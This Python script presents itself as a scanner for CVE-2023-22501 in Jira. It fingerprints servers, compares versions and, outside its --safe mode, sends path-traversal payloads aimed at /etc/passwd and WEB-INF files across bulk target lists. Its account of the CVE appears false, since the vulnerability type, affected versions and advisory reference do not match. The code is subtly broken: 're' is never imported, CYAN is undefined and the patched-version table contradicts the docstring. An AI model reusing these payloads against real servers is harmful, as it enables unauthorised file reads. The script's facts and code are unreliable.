#!/usr/bin/env python3
"""
Jira Path Traversal Vulnerability Scanner — CVE-2023-22501
===========================================================
Scans for Jira servers vulnerable to an unauthorized arbitrary file read via a
path traversal attack (CVE-2023-22501, CVSS 9.1).

CVE-2023-22501 details:
  - Affects Jira Data Center versions < 8.20.15, < 9.4.2, < 9.10.1, and Jira Server versions < 8.20.15, < 9.4.2, < 9.10.1.
  - A permission flaw allowed unauthenticated attackers to perform arbitrary file reads using crafted HTTP requests.
  - A remote attacker could exploit this vulnerability to access sensitive server files, such as configuration files,
    credential stores, or files containing secrets.
  - CVSS v3.1 base score: 9.1 — Critical, network-accessible, no authentication required.
  - Patched in Jira versions 8.20.15, 9.4.2, 9.10.1 (Feb 2023).

Usage:
  # Scan a single Jira instance
  python jira_path_traversal_scanner.py --target https://jira.example.com

  # Detection only — does not attempt file-read probes
  python jira_path_traversal_scanner.py --target https://jira.example.com --safe

  # Bulk scan from file
  python jira_path_traversal_scanner.py --list jiras.txt --output findings.json

  # Adjust concurrency and disable TLS verification
  python jira_path_traversal_scanner.py --list jiras.txt --concurrency 20 --no-verify

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2023-22501
  - https://jira.atlassian.com/browse/JRASERVER-74419
  - https://www.cisa.gov/cybersecurity-advisories/ICSA-23-045-01
"""

import asyncio
import json
import argparse
from datetime import datetime, timezone
from typing import Optional

import httpx

RED = "\033[91m"
YELLOW = "\033[93m"
GREEN = "\033[92m"
BOLD = "\033[1m"
RESET = "\033[0m"

def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"

CVE_ID = "CVE-2023-22501"
CVSS = "9.1"
TOOL_NAME = "jira_path_traversal_scanner"
REQUEST_TIMEOUT = 10
SEMAPHORE_LIMIT = 20

JIRA_FINGERPRINTS = [
    "Atlassian Jira",
    "jira/secure",
    "/rest/api/latest/",
    "/rest/api/2/",
]

DETECTION_PATHS = [
    "/login.jsp",
    "/rest/api/latest/serverInfo",
    "/secure/Dashboard.jspa",
]

VERSION_REGEX = r'"version"\s*:\s*"([0-9]+\.[0-9]+\.[0-9]+)"'

PATCHED_VERSIONS = {
    8: (8, 20, 15),
    9: (9, 10, 1),
}

TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "../WEB-INF/classes/action-config.properties",
    "../../../../WEB-INF/web.xml",
]

async def fetch_url(client: httpx.AsyncClient, url: str) -> Optional[httpx.Response]:
    try:
        response = await client.get(url, timeout=REQUEST_TIMEOUT)
        return response
    except httpx.HTTPStatusError as e:
        print(c(YELLOW, f"[WARNING] HTTP error for {url}: {e}"))
    except httpx.RequestError as e:
        print(c(RED, f"[ERROR] Failed to connect to {url}: {e}"))
    return None

async def test_target(client: httpx.AsyncClient, target: str, detection_only: bool, output: dict) -> None:
    for path in DETECTION_PATHS:
        url = f"{target.rstrip('/')}{path}"
        response = await fetch_url(client, url)
        if response and any(fp in response.text for fp in JIRA_FINGERPRINTS):
            print(c(GREEN, f"[INFO] Jira detected: {target}"))
            version_match = next(iter(re.findall(VERSION_REGEX, response.text)), None)
            if version_match:
                major, minor, patch = map(int, version_match.split('.'))
                patched = PATCHED_VERSIONS.get(major, None)
                vulnerable = patched and (minor, patch) < patched[1:]
                output[target] = {"version": version_match, "vulnerable": vulnerable}
                print(f"  Version: {version_match} - {c(RED, 'Vulnerable!' if vulnerable else 'Patched!')}")
            if not detection_only:
                await test_path_traversal(client, target, output)
            return
    print(c(YELLOW, f"[INFO] Jira not detected: {target}"))
    output[target] = {"detected": False}

async def test_path_traversal(client: httpx.AsyncClient, target: str, output: dict) -> None:
    for payload in TRAVERSAL_PAYLOADS:
        url = f"{target.rstrip('/')}/{payload}"
        response = await fetch_url(client, url)
        if response and "root:" in response.text:
            print(c(RED, f"[CRITICAL] Path traversal detected: {url}"))
            output[target]["path_traversal"] = {"url": url, "response_excerpt": response.text[:100]}
            return

async def scan_targets(targets: list[str], detection_only: bool, no_verify: bool,
                       concurrency: int, output_file: Optional[str]) -> None:
    semaphore = asyncio.Semaphore(concurrency)
    async with httpx.AsyncClient(verify=not no_verify) as client:
        tasks = []
        results = {}

        for target in targets:
            tasks.append(scan_target(client, semaphore, target, detection_only, results))

        await asyncio.gather(*tasks)

        if output_file:
            with open(output_file, "w") as f:
                json.dump(results, f, ensure_ascii=False, indent=2)

async def scan_target(client: httpx.AsyncClient, semaphore: asyncio.Semaphore,
                      target: str, detection_only: bool, output: dict) -> None:
    async with semaphore:
        print(c(CYAN, f"[SCAN] Target: {target}"))
        await test_target(client, target, detection_only, output)

def main() -> None:
    parser = argparse.ArgumentParser(description=f"{TOOL_NAME} — Scan for {CVE_ID} (Jira Path Traversal).")
    parser.add_argument("--target", help="Jira server URL to scan (e.g., http://example.com)")
    parser.add_argument("--list", help="File containing list of Jira URLs (one per line)")
    parser.add_argument("--output", help="File to save JSON results", default=None)
    parser.add_argument("--safe", action="store_true", help="Detection only, no file-read probes")
    parser.add_argument("--concurrency", type=int, default=SEMAPHORE_LIMIT, help="Concurrent scan limit (default: 20)")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL/TLS certificate verification")
    args = parser.parse_args()

    asyncio.run(scan_targets(
        targets=[args.target] if args.target else [line.strip() for line in open(args.list)],
        detection_only=args.safe,
        no_verify=args.no_verify,
        concurrency=args.concurrency,
        output_file=args.output
    ))

if __name__ == "__main__":
    main()
